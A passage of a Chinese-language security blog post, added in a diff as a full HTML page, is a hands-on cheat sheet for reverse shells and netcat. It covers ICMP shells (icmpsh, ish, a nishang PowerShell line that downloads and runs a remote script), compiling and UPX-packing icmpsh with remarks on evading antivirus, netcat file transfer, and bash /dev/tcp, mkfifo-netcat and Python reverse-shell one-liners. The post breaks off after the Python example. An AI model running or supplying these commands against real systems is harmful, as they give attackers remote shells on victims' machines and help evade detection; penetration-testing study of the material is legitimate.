@@ -1,0 +1,856 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="nc体积小，功能强大,跨平台，有了nc就不需要telnet了。nc可以完成telnet的所有工作.  nc下载 32位比64位更稳定些。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="反弹Shell方式以及端口转发">
+<meta property="og:url" content="http://atsud0.me/2020/04/24/netcat-socat%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="nc体积小，功能强大,跨平台，有了nc就不需要telnet了。nc可以完成telnet的所有工作.  nc下载 32位比64位更稳定些。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101142913021.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101143251260.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101143425591.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101151107570.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101153255502.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101153344176.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101152216441.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101161706406.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201101163826019.png">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200417_101430.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/image-20201126132609324.png">
+<meta property="article:published_time" content="2020-04-24T10:37:48.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.459Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="nc">
+<meta property="article:tag" content="ncat">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/image-20201101142913021.png">
+
+<link rel="canonical" href="http://atsud0.me/2020/04/24/netcat-socat%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>反弹Shell方式以及端口转发 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/04/24/netcat-socat%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          反弹Shell方式以及端口转发
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-04-24 18:37:48" itemprop="dateCreated datePublished" datetime="2020-04-24T18:37:48+08:00">2020-04-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/Tools/" itemprop="url" rel="index"><span itemprop="name">Tools</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>7.5k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <blockquote>
+<p>nc体积小，功能强大,跨平台，有了nc就不需要telnet了。nc可以完成telnet的所有工作.</p>
+</blockquote>
+<p><a href="https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe" target="_blank" rel="noopener">nc下载</a></p>
+<p>32位比64位更稳定些。</p>
+<a id="more"></a>
+
+<h2 id="ICMP-Shell"><a href="#ICMP-Shell" class="headerlink" title="ICMP-Shell"></a>ICMP-Shell</h2><p>Windows和Linux下建立基于ICMP下的reverse shell方法。</p>
+<h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><p>先下载<a href="https://github.com/inquisb/icmpsh.git" target="_blank" rel="noopener">项目</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;inquisb&#x2F;icmpsh.git &#x2F;opt&#x2F;icmp_reverse_shell</span><br></pre></td></tr></table></figure>
+
+<p>Kali预装了<code>python2</code>和<code>python3</code>，但是却不预装<code>pip</code>。。加上pip2已经被移除官方源，所以只能通过<code>get-pip.py</code>来安装。</p>
+<p>python2-pip&amp;pip2-impacket安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/2.6/get-pip.py</span><br><span class="line">python2 get-pip.py</span><br><span class="line"></span><br><span class="line">pip2 -V</span><br><span class="line"></span><br><span class="line">pip2 install --upgrade pip</span><br><span class="line"></span><br><span class="line">pip2 install impacket</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201101142913021.png" alt="image-20201101142913021"></p>
+<p>这样就算是监听起来了。</p>
+<p>这里输入的ip，是要公网地址，或者是内网地址。所以受害者必须要有一个公网ip地址，能让icmp包直达，或者是你在内网里，用跳板机起的监听。</p>
+<h3 id="0x02-实验"><a href="#0x02-实验" class="headerlink" title="0x02 实验"></a>0x02 实验</h3><h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><p>但是，不成功在<code>Windows10</code>下使用脚本给出的</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpsh.exe -t <span class="number">192</span>.<span class="number">168</span>.<span class="number">179</span>.<span class="number">128</span> -d <span class="number">500</span> -v <span class="number">30</span> -s <span class="number">128</span></span><br></pre></td></tr></table></figure>
+
+<p>并没有像文章<a href="https://www.freebuf.com/articles/system/50361.html" target="_blank" rel="noopener">剑走偏锋：细数Shell那些事</a>作者<code>xia0k</code>那样直接返回一个<code>shell</code>。<code>Win10</code>下运行什么反应都没。。(待后续继续尝试)</p>
+<p>换<code>windows server 2012</code>。好家伙，有反应了。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201101143251260.png" alt="image-20201101143251260"></p>
+<p>因为是走icmp，所以在windows下使用<code>netstat -ant</code>命令是看不到有外连ip的。只能从进程中看到</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201101143425591.png" alt="image-20201101143425591"></p>
+<p>这程序也是会报毒的，所以要自己做下免杀才行。但实际上对源码不做改动，刚编译出来拿去跑<a href="http://www.virustotal.com" target="_blank" rel="noopener">virustotal.com</a>国内大部分杀毒都没识别到呢</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201101151107570.png" alt="image-20201101151107570"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux编译</span></span><br><span class="line"></span><br><span class="line">apt install gcc-mingw-w64</span><br><span class="line"></span><br><span class="line">i686-w64-mingw32-gcc-win32 icmpsh-s.c -o abc.exe</span><br><span class="line"></span><br><span class="line">upx -v abc.exe -o abc-slave.exe</span><br></pre></td></tr></table></figure>
+
+<h4 id="powershell-reverse-icmp-shell"><a href="#powershell-reverse-icmp-shell" class="headerlink" title="powershell reverse icmp shell"></a>powershell reverse icmp shell</h4><p><code>Windows</code> 下也可以去用<a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellIcmp.ps1" target="_blank" rel="noopener">powershell</a>滴。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com</span></span><br><span class="line"><span class="string">/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);</span><br><span class="line"><span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">192.168</span>.<span class="number">159.134</span> <span class="literal">-port</span> <span class="number">6666</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/image-20201101153255502.png" alt="image-20201101153255502"></p>
+<p><img src="https://images.atsud0.me/images/post/image-20201101153344176.png" alt="image-20201101153344176"></p>
+<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><p>在<code>Google</code>找到以下文章，可能是<code>icmp-shell</code>的Linux版 : <a href="https://medium.com/@int0x33/day-20-ping-pwn-icmp-shell-for-linux-using-icmp-tunnels-2bab37eda271" target="_blank" rel="noopener">ping-pwn — Writing an ICMP Shell for Linux using ICMP tunnels &amp; Scapy</a></p>
+<p>但是呢，即使是在root用户下运行也提示。。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201101152216441.png" alt="image-20201101152216441"></p>
+<p>经过Google，我发现[<a href="https://github.com/bgylde/PingForAndroid/issues/1]这里给出了一个解决方案" target="_blank" rel="noopener">https://github.com/bgylde/PingForAndroid/issues/1]这里给出了一个解决方案</a></p>
+<blockquote>
+<p>Have a try for socket(AF_INET, SOCK_RAW, IPPROTO_ICMP). You need to assemble the ICMP package yourself.</p>
+</blockquote>
+<p>改动了一下代码后，脚本确实能起来了。但是执行的结果是啥我也不知道。。看上去是没有正确的将执行结果发回来</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201101161706406.png" alt="image-20201101161706406"></p>
+<h4 id="ish"><a href="#ish" class="headerlink" title="ish"></a><a href="http://icmpshell.sourceforge.net/" target="_blank" rel="noopener">ish</a></h4><p>相比上面那两个脚本，ish更为简单易用，，不过要注意的是这个<code>ish</code>是<code>bind shell</code>。并不是<code>reverse shell</code>。</p>
+<p>安装并编译</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://nchc.dl.sourceforge.net/project/icmpshell/ish/v0.2/ish-v0.2.tar.gz</span><br><span class="line">tar zxvf ish-v0.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> ISHELL-v0.2/</span><br><span class="line">make linux</span><br></pre></td></tr></table></figure>
+
+<p>被控端执行 ishd</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;ishd -i 65535 -t 0 -p 1024</span><br></pre></td></tr></table></figure>
+
+<p>控制端执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;ish -i 65535 -t 0 -p 1024 192.168.179.128</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>sessions id</code>要对应，即<code>-i</code>参数控制端和被控制端要一致。</p>
+<p>更坑的是，<code>ishd</code>不管你执行成不成功都不会有任何回显信息，只能通过<code>ps</code>来查看进程到底有没有在运行，即使运行了也可能会有种种原因，导致控制的无法连接。。</p>
+<p><img src="https://images.atsud0.me/images/post/image-20201101163826019.png" alt="image-20201101163826019"></p>
+<h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>现阶段，就Windows的ICMP Reverse Shell 来说成熟。Linux的就。。。</p>
+<h3 id="本节参考链接"><a href="#本节参考链接" class="headerlink" title="本节参考链接"></a>本节参考链接</h3><ul>
+<li><a href="https://www.freebuf.com/articles/system/50361.html" target="_blank" rel="noopener">剑走偏锋：细数Shell那些事</a></li>
+<li><a href="https://medium.com/@int0x33/day-20-ping-pwn-icmp-shell-for-linux-using-icmp-tunnels-2bab37eda271" target="_blank" rel="noopener">ping-pwn — Writing an ICMP Shell for Linux using ICMP tunnels &amp; Scapy</a></li>
+<li><a href="https://lilydjwg.is-programmer.com/2013/10/29/non-privileged-icmp-ping.41390.html" target="_blank" rel="noopener">不需要 root 权限的 ICMP ping-依云</a></li>
+<li><a href="[https://github.com/bgylde/PingForAndroid/issues/1]">IPPROTO_ICMP Permission denied</a></li>
+<li><a href="http://www.361way.com/linux-icmp-shell-ish/3284.html" target="_blank" rel="noopener">linux下一个ICMP shell（backdoor）</a></li>
+<li>[powershell反弹shell的常见方式](</li>
+</ul>
+<h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>nc可以做什么?</p>
+<ul>
+<li>传输文本信息(明文</li>
+<li>传输文件/目录</li>
+<li>加密传输文件</li>
+<li>远程控制/木马   —-nc不会被杀毒软件查杀?</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
+<li>远程克隆硬盘</li>
+</ul>
+<p>可以做客户端使用，也可以做服务端。</p>
+<p>作为客户端时，不建议直接去解析域名，应该直接连接他的ip地址<br> -v 显示详细的连接信息<br> -n 不进行dns<br> -q 标准输入后等待x秒后退出<br> -l 开始监听<br> -p 指定端口<br> -z 端口扫描<br> -c 提供shell</p>
+<p>nc的弱点:</p>
+<ul>
+<li>明文传输,容易被嗅探,容易被中间人劫持.</li>
+<li>缺乏身份验证</li>
+</ul>
+<p>nc的升级版–ncat 可以使用ssl加密和允许某个ip连接</p>
+<h4 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h4><p>服务端:<br><code>nc -lvp 1234</code></p>
+<p>客户端:<br><code>nc -nv ip 1234</code></p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200417_101430.jpg" alt="传输文本信息"></p>
+<h4 id="利用nc进行收集信息"><a href="#利用nc进行收集信息" class="headerlink" title="利用nc进行收集信息"></a>利用nc进行收集信息</h4><p>A服务端:<br><code>ps -ef|nc -lvp 1234</code></p>
+<p>B客户端:<br><code>nc -nv ip 1234 &gt; ps.txt</code></p>
+<p>这个是由A服务端传给B客户端</p>
+<p>A服务端:<br><code>nc -lvp 1234 &gt; a.txt</code><br>B客户端:<br><code>ls -l|nc -nv ip 1234</code></p>
+<p>这个是由B客户端发给A服务端</p>
+<p>为什么要这样进行因为电子取证的时候，要保护目标机器的原始状态，保证目标机器的文件不被损坏。</p>
+<h4 id="传输文件"><a href="#传输文件" class="headerlink" title="传输文件"></a>传输文件</h4><p>将B的a.txt文件传给A</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 1234&gt;a.txt</span><br><span class="line">B:nc -nv ip 1234 &lt;a.txt -q 1</span><br></pre></td></tr></table></figure>
+
+<p>将A的2.sh文件传给B</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 1234 &lt;2.sh</span><br><span class="line">B:nc -nv ip 1234 &gt;c.txt -q 1</span><br></pre></td></tr></table></figure>
+
+<h5 id="加密传输文件"><a href="#加密传输文件" class="headerlink" title="加密传输文件"></a>加密传输文件</h5><p>A机器监听端口等待文件上传解密<br>B机器上的a.nmap加密后传送给A机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lvp 1234|mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; b.nmap</span><br><span class="line">B:mcrypt --flush -Fbq -a rijndael-256 -m ecb&lt;a.nmap|nc -nv ip -q 1</span><br></pre></td></tr></table></figure>
+
+<h4 id="传输目录"><a href="#传输目录" class="headerlink" title="传输目录"></a>传输目录</h4><p>将A机器的目录打包后传输给B机器解包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:tar cvf - .&#x2F;aaa | nc -lvp 1234 -q 1</span><br><span class="line">B:nc -nv ip 1234 | tar xf - .&#x2F;</span><br></pre></td></tr></table></figure>
+
+
+<p>反向连接，B机器等待A上线发送文件包并解压</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:tar cvf - .&#x2F;aaa |nc -nv ip 1234</span><br><span class="line">B:nc -lvp 1234|tar xf - .&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h5 id="加密传输目录"><a href="#加密传输目录" class="headerlink" title="加密传输目录"></a>加密传输目录</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lvp 1234|mcrypt --flush -Fbqd -a rijndael-256 -m ecb|tar xvf -</span><br><span class="line"></span><br><span class="line">B:tar cvf - .&#x2F;aaa |mcrypt --flush -Fbq -a rijndael-256 -m ecb|nc -nv ip 1234 -q 1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:tar cvf - .&#x2F;Downloads|mcrypt --flush -Fbq -a rijndael-256 -m ecb|nc -lvp 1234 -q 1</span><br><span class="line">B:nc -nv ip 1234|mcrypt --flush -Fbqd -a rijndael-256 -m ecb|tar xvf - .&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h4 id="流媒体服务器"><a href="#流媒体服务器" class="headerlink" title="流媒体服务器"></a>流媒体服务器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat 1.mp4|mc -lp</span><br></pre></td></tr></table></figure>
+
+<h4 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h4><p>不建议。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz ip 1-65535</span><br></pre></td></tr></table></figure>
+
+<h4 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h4><h5 id="正向"><a href="#正向" class="headerlink" title="正向"></a>正向</h5><p>A开启监听端口1234 提供bash，等待连接<br>B 连接上A，B控制A</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 1234 -c bash</span><br><span class="line">B:nc -nv ip 1234</span><br></pre></td></tr></table></figure>
+
+<h5 id="反向"><a href="#反向" class="headerlink" title="反向"></a>反向</h5><p>A开启监听端口1234，<br>B连接A的，并提供shell</p>
+<p>A控制B</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nc -lp 1234</span><br><span class="line">B:nc -nv ip 1234 -c bash</span><br></pre></td></tr></table></figure>
+
+<p>为什么要使用反向而不是正向?因为在idc机房中边界一般会有防火墙,通常防火墙一般不会打开一个不常见的端口允许外部的机器来进行连接.所以要使用反向连接,让在防火墙内部的机器去连接外部的机器</p>
+<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A:nv -lvp 1234</span><br><span class="line">B:bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>bash -i 打开一个bash</p>
+<p>&gt;&amp; 将标准输出和标准错误输出重定向到了 /dev/tcp/ip/1234 这个远程设备上。</p>
+<p>0&gt;&amp;1 代表将标准输入重定向到标准输出，但是标准输出已经被重定向到了远程设备上，所以标准输入也被重定向到了远程设备上。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 1.1.1.1 1234 &gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>
+
+<p>注意:/dev/tcp这个只在bash里有。</p>
+<blockquote>
+<p>hz大佬:所以bash为啥会有这东西啊，(bash果真就搞破坏专用（，自带一堆方便后门的工具（</p>
+</blockquote>
+<blockquote>
+<p>过于生草..</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;bin&#x2F;bash -c &#39;$@|bash&#39; &#39;&#39; &#39;echo&#39; &#39;bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;4444 0&lt;&amp;1&#39;</span><br></pre></td></tr></table></figure>
+<p>来自<a href="https://mp.weixin.qq.com/s/CAtsX3yP81mULbMDTo0J1A" target="_blank" rel="noopener">文章</a></p>
+<h4 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A：nc -lvp 8888</span><br><span class="line">B：python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.10.10&#39;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])&quot;</span><br></pre></td></tr></table></figure>
+
